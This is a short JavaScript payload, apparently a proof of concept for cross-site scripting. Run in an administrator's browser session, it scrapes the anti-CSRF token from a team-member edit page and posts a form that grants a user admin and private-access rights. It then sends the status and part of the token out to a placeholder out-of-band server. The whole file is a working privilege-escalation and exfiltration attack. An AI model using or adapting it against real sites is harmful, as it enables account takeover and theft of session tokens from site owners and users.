(async function(){
  // Fetch the edit page to get a fresh CSRF token from the victim's session
  var r = await fetch('/Team/EditTeamMember/61491');
  var h = await r.text();
  var m = h.match(/name="__RequestVerificationToken"[^>]*value="([^"]+)"/);
  if(!m) return;
  var t = m[1];

  // Promote attacker (ID 61455) to admin using victim's admin session
  var b = new URLSearchParams();
  b.append('ID','61491');
  b.append('FirstName','Test');
  b.append('LastName','User');
  b.append('IsEnabled','true');
  b.append('IsAdmin','true');
  b.append('PrivateTemplates','true');
  b.append('PrivateJobs','true');
  b.append('__RequestVerificationToken', t);
  b.append('IsEnabled','false');
  b.append('IsAdmin','false');
  b.append('PrivateTemplates','false');
  b.append('PrivateJobs','false');

  var res = await fetch('/Team/SaveTeamMember',{
    method:'POST',
    headers:{'Content-Type':'application/x-www-form-urlencoded'},
    body: b.toString(),
    redirect:'follow'
  });

  // Exfil proof to attacker server (replace with your OOB server)
  new Image().src='https://YOUR_OOB_SERVER/?status='+res.status+'&csrf='+encodeURIComponent(t.substring(0,20));
})();
